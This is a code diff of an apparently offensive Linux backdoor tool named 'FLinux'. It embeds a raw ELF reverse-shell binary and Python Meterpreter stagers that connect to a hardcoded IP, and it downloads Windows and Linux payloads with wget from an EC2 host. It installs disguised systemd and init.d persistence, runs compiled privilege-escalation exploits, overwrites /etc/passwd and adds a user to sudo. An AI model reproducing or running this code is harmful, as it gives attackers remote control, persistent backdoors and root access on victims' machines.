@@ -7,70 +7,128 @@ import string
 import random
 import subprocess
 
-# PORT 8194->python meterpreter_reverse_tcp 8193->Python reverse_tcp 8195->linux_reverse_shel;8197->python_reverse_http
+# PORTS =>
+# 8192->linux_Meterpreter_reverseTcp
+# 8194->python meterpreter_reverse_tcp  
+# 8195->linux_Meterpreter_reverse_https 
+# 8196->windows32_meterpreter_reverse_https
+# 8197->python_meterpreter_reverse_http
+# 8198->windows64_meterpreter_reverse_https
 
 
 class GetShell:
     def __init__(self):
         print("\nGetting a Shell...")
-        os.system("rm -rf /root/pyn.sh\nrm -rf /rot/pyns.sh\nrm -rf /root/pyn.py\n")
+        self.pwd = subprocess.check_output(['pwd'])
+        self.pwd = self.pwd[:len(self.pwd)-1]
+        os.system("rm -rf "+self.pwd+"/pyn.sh\nrm -rf "+self.pwd+"/pyns.sh\nrm -rf "+self.pwd+"/pyn.py\n")
         return 
-    def linux_reverseTcp(self):
-        i8195 = '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\xf9\x00\x00\x00\x00\x00\x00\x00z\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H1\xffj\tX\x99\xb6\x10H\x89\xd6M1\xc9j"AZ\xb2\x07\x0f\x05H\x85\xc0xRj\nAYVPj)X\x99j\x02_j\x01^\x0f\x05H\x85\xc0x;H\x97H\xb9\x02\x00 \x03\r\xe8\xc2oQH\x89\xe6j\x10Zj*X\x0f\x05YH\x85\xc0y%I\xff\xc9t\x18Wj#Xj\x00j\x05H\x89\xe7H1\xf6\x0f\x05YY_H\x85\xc0y\xc7j<Xj\x01_\x0f\x05^Z\x0f\x05H\x85\xc0x\xef\xff\xe6'
-        f = open("/root/lrt", "wb")
-        f.write(i8195)
+######################################################
+    def linux_python_ScriptCreate(self, payload, scriptname):
+        f = open(self.pwd+"/"+scriptname+".py", "wb")
+        f.write(payload)
         f.close()
-        os.system("chmod +x /root/lrt\nnohup /root/lrt &")
-        f = open("/root/pyns.sh", "wb")
-        s = """#!/bin/sh\nnohup /root/lrt &"""
+        os.system("chmod +x "+self.pwd+"/"+scriptname+".py")
+        s = subprocess.check_output(['which', 'python'])
+        s = s[:len(s)-1]
+        f = open(self.pwd+"/"+scriptname+".sh", "wb")
+        s = "#!/bin/sh\nnohup " + s + " " + self.pwd+"/"+scriptname+".py &\n"
         f.write(s)
         f.close()
-        os.system("chmod +x /root/pyns.sh")
-    def python_meterpreter_reverseTcp(self):
+        os.system("chmod +x "+self.pwd+"/"+scriptname+".sh\nsh "+self.pwd+"/"+scriptname+".sh")
+######################################################
+    def linux_native_ScriptCreate(self, scriptname):
+        os.system("chmod +x "+self.pwd+"/"+scriptname+"\nnohup "+self.pwd+"/"+scriptname+" &")
+        f = open(self.pwd+"/"+scriptname+".sh", "wb")
+        s = "#!/bin/sh\nnohup "+self.pwd+"/"+scriptname+" &"
+        f.write(s)
+        f.close()
+        os.system("chmod +x "+self.pwd+"/"+scriptname+".sh")
+######################################################
+    def linux_native_binaryProcess(self, payload, scriptname, auto=False):
+        f = open(self.pwd + "/"+scriptname+".o", "wb")
+        f.write(payload)
+        f.close()
+        if auto:
+            pl = self.python_AutomateWrapper(scriptname+".o", timer=30)
+            self.linux_python_ScriptCreate(pl, scriptname)
+            return pl
+        else:
+            self.linux_native_ScriptCreate(scriptname)
+            return payload
+######################################################
+    def python_AutomateWrapper(self, scriptname, payload = None, python = False, timer=30): 
+        # Generates a Python Payload Wrapper to automatically execute the payload every given seconds
+        s = ""
+        if python:
+            pl = """import os,time\ns = '"""+payload.encode('hex')+"""'\nwhile True:\n\ttry:\n\t\texec(s.decode('hex'))\n\t\ttime.sleep("""+str(timer)+""")\n\texcept:\n\t\tprint("trying again")"""
+            return pl
+        else :
+            if payload is not None:
+                f = open(self.pwd+"/"+scriptname, "wb")
+                f.write(payload)
+                f.close()
+        s = "chmod +x "+self.pwd+"/"+scriptname
+        pl = """import os,time\nos.system(" """+s+""" ")\nwhile True:\n\ttry:\n\t\tos.system("./""" + scriptname + """")\n\t\ttime.sleep("""+str(timer)+""")\n\texcept:\n\t\tprint("trying again")"""
+        return pl
+######################################################
+##################### Payloads #######################
+######################################################
+    def linuxPyAuto_reverseTcp(self):       # Tested
+        i8192 = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\xf9\x00\x00\x00\x00\x00\x00\x00z\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H1\xffj\tX\x99\xb6\x10H\x89\xd6M1\xc9j"AZ\xb2\x07\x0f\x05H\x85\xc0xRj\nAYVPj)X\x99j\x02_j\x01^\x0f\x05H\x85\xc0x;H\x97H\xb9\x02\x00 \x00\r\xe8\xc2oQH\x89\xe6j\x10Zj*X\x0f\x05YH\x85\xc0y%I\xff\xc9t\x18Wj#Xj\x00j\x05H\x89\xe7H1\xf6\x0f\x05YY_H\x85\xc0y\xc7j<Xj\x01_\x0f\x05^Z\x0f\x05H\x85\xc0x\xef\xff\xe6'
+        self.linux_native_binaryProcess(i8192, "pyns", auto=True)   # Automated By Python Wrapper
+######################################################
+    def linuxNative_reverseTcp(self):
+        i8192 = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\xf9\x00\x00\x00\x00\x00\x00\x00z\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H1\xffj\tX\x99\xb6\x10H\x89\xd6M1\xc9j"AZ\xb2\x07\x0f\x05H\x85\xc0xRj\nAYVPj)X\x99j\x02_j\x01^\x0f\x05H\x85\xc0x;H\x97H\xb9\x02\x00 \x00\r\xe8\xc2oQH\x89\xe6j\x10Zj*X\x0f\x05YH\x85\xc0y%I\xff\xc9t\x18Wj#Xj\x00j\x05H\x89\xe7H1\xf6\x0f\x05YY_H\x85\xc0y\xc7j<Xj\x01_\x0f\x05^Z\x0f\x05H\x85\xc0x\xef\xff\xe6'
+        self.linux_native_binaryProcess(i8192, "pyns", auto=False)  # Pure Binary
+######################################################
+    def python_meterpreter_reverseTcp(self):    # Already Automated, Tested
         i8194 = "import socket,struct,time\no = 5\nwhile True:\n\twhile True:\n\t\ttry:\n\t\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\t\ts.connect(('13.232.194.111',8194))\n\t\t\tbreak\n\t\texcept:\n\t\t\ttime.sleep(o)\n\tl=struct.unpack('>I',s.recv(4))[0]\n\td=s.recv(l)\n\twhile len(d)<l:\n\t\td+=s.recv(l-len(d))\n\texec(d,{'s':s})\n\to = 50\n\ttime.sleep(o)"
-        os.system('echo """'+i8194+'""" > /root/pyn.py\nchmod +x /root/pyn.py')
-        s = subprocess.check_output(['which', 'python'])
-        s = s[:len(s)-1]
-        f = open("/root/pyn.sh", "wb")
-        s = "#!/bin/sh\nnohup " + s + " /root/pyn.py &\n"
-        f.write(s)
-        f.close()
-        os.system("chmod +x /root/pyn.sh\nsh /root/pyn.sh")
-    def python_meterpreter_reverseHttp(self):
-        i8197 = """s="import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJ10pCmhzPVtdCm89dWwuYnVpbGRfb3BlbmVyKCpocykKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJyldCmV4ZWMoby5vcGVuKCdodHRwOi8vMTMuMjMyLjE5NC4xMTE6ODE5Ny80dWU0SjhrWUxpNHV1RHVzZGRtN1BnT1RETDdiX20yMDhNeEN5YkFtbDBrV0g5UzEzX1liNWp3WFVwJykucmVhZCgpKQo=')))";import time;\nwhile True:\n\ttry:\n\t\texec(s)\n\texcept:\n\t\tprint('got some error, trying again...');\n\ttime.sleep(50)"""
-        os.system('echo """'+i8197+'""" > /root/pynh.py\nchmod +x /root/pynh.py')
-        s = subprocess.check_output(['which', 'python'])
-        s = s[:len(s)-1]
-        f = open("/root/pynh.sh", "wb")
-        s = "#!/bin/sh\nnohup " + s + " /root/pynh.py &\n"
-        f.write(s)
-        f.close()
-        os.system("chmod +x /root/pynh.sh\nsh /root/pynh.sh")
-    def set_onStartup(self):
+        self.linux_python_ScriptCreate(i8194, "pyn")
+######################################################
+    def python_meterpreter_reverseHttp(self):        # Tested
+        i8197 = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJ10pCmhzPVtdCm89dWwuYnVpbGRfb3BlbmVyKCpocykKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJyldCmV4ZWMoby5vcGVuKCdodHRwOi8vMTMuMjMyLjE5NC4xMTE6ODE5Ny80dWU0SjhrWUxpNHV1RHVzZGRtN1BnT1RETDdiX20yMDhNeEN5YkFtbDBrV0g5UzEzX1liNWp3WFVwJykucmVhZCgpKQo=')))"
+        i8197 = self.python_AutomateWrapper("_pynh.py", payload = i8197, python=True, timer=30)
+        self.linux_python_ScriptCreate(i8197, "pynh")
+######################################################
+    def windows64_meterpreter_reverseHttps(self):
+        os.system("wget 'ec2-13-232-194-111.ap-south-1.compute.amazonaws.com/fifa64.exe'")
+######################################################
+    def windows32_meterpreter_reverseHttps(self):
+        os.system("wget 'ec2-13-232-194-111.ap-south-1.compute.amazonaws.com/fifa32.exe'")
+######################################################
+    def linux64_meterpreter_reverseHttps(self):     # Tested
+        os.system("wget 'ec2-13-232-194-111.ap-south-1.compute.amazonaws.com/linux64.o' -O pynlh")
+        self.linux_native_ScriptCreate("pynlh")
+######################################################
+    def setPersistance(self, scriptname):
         try:
-            f = open("/lib/systemd/system/pyn.service", "wb")   # Python Reverse Meterpreter shell
-            s = "[Unit]\nDescription=Something Special Again\nType=idle\n\n[Service]\nExecStart=/root/pyn.sh\n\n[Install]\nWantedBy=multi-user.target"
+            f = open("/lib/systemd/system/"+scriptname+".service", "wb")   # Python Reverse Meterpreter shell
+            s = "[Unit]\nDescription=Something Special Again\nType=idle\n\n[Service]\nExecStart="+self.pwd+"/"+scriptname+".sh\n\n[Install]\nWantedBy=multi-user.target"
             f.write(s)
             f.close()
-            os.system("chmod 664 /lib/systemd/system/pyn.service\nsystemctl daemon-reload\nsystemctl enable pyn.service")
-            f = open("/lib/systemd/system/pynh.service", "wb")   # Python Reverse HTTP Meterpreter shell
-            s = "[Unit]\nDescription=Something Special Again\nType=idle\n\n[Service]\nExecStart=/root/pynh.sh\n\n[Install]\nWantedBy=multi-user.target"
-            f.write(s)
-            f.close()
-            os.system("chmod 664 /lib/systemd/system/pynh.service\nsystemctl daemon-reload\nsystemctl enable pynh.service")
-            f = open("/lib/systemd/system/pyns.service", "wb")  # Linux Generic Shell<Backup>
-            s = "[Unit]\nDescription=Something Special\nType=idle\n\n[Service]\nExecStart=/root/pyns.sh\n\n[Install]\nWantedBy=multi-user.target"
-            f.write(s)
-            f.close()
-            os.system("chmod 664 /lib/systemd/system/pyns.service\nsystemctl daemon-reload\nsystemctl enable pyns.service")
         except:
-            print("trying other methods...") 
-        # Backup Methods -->
-        os.system("cp /root/pyn.sh /etc/init.d/\nupdate-rc.d pyn.sh defaults\nservice pyn.sh start")
-        os.system("cp /root/pynh.sh /etc/init.d/\nupdate-rc.d pynh.sh defaults\nservice pynh.sh start")
-        os.system("cp /root/pyns.sh /etc/init.d/\nupdate-rc.d pyns.sh defaults\nservice pyns.sh start")
-        return
+            print("")
+        os.system("cp "+self.pwd+"/"+scriptname+".sh /etc/init.d/\nupdate-rc.d "+scriptname+".sh defaults\nservice "+scriptname+".sh start") 
+        return   
+######################################################
+    def set_onStartup(self):
+        self.setPersistance('pyn')
+        self.setPersistance('pynh')
+        self.setPersistance('pyns')
+        self.setPersistance('pynlh')
+######################################################
+    def defaultBackdoors(self):
+        self.linuxPyAuto_reverseTcp()
+        self.linuxNative_reverseTcp()
+        self.linux64_meterpreter_reverseHttps()
+        self.python_meterpreter_reverseTcp()
+        self.python_meterpreter_reverseHttp()
+        self.windows64_meterpreter_reverseHttps()
+        self.windows32_meterpreter_reverseHttps()
 
+s = GetShell()
+s.linuxNative_reverseTcp()
 
 class ExploitLoader:
     def __init__(self):
@@ -95,7 +153,7 @@ class ExploitLoader:
     def defaultConfigCompile(self, fname, arg = ""):
         return os.system("gcc -pthread -lcrypt /tmp/"+fname+".c -o /tmp/"+fname+"\nchmod +x /tmp/"+fname+"\ncd /tmp/\n./"+fname+" "+arg)
     def dc0Compile(self, fname, arg = ""):
-        return os.system("gcc -pthread /tmp/"+fname+".c -o /tmp/"+fname+"\ncd /tmp\nchmod +x "+fname+"\n./"+fname+" "+arg+"\ncp /tmp/bak /etc/passwd\necho 0 > /proc/sys/vm/dirty_writeback_centisecs\nusermod -aG sudo matlab\n")
+        return os.system("gcc -pthread /tmp/"+fname+".c -o /tmp/"+fname+"\ncd /tmp\nchmod +x "+fname+"\n./"+fname+" "+arg+"\ncp /tmp/bak /etc/passwd\nusermod -aG sudo matlab\n")
     def loadExploit(self, filename, compileConfig = None):
         f = open(filename, "rb")
         s = f.read()
@@ -136,7 +194,6 @@ print("\nWelcome to FLinux v1.0, Lets get Hackin...SSHhhhhh!...\n")
 g = ExploitLoader()
 g.executeExploit()
 s = GetShell();
-s.linux_reverseTcp();
-s.python_meterpreter_reverseTcp();
+s.defaultBackdoors()
 s.set_onStartup();
 
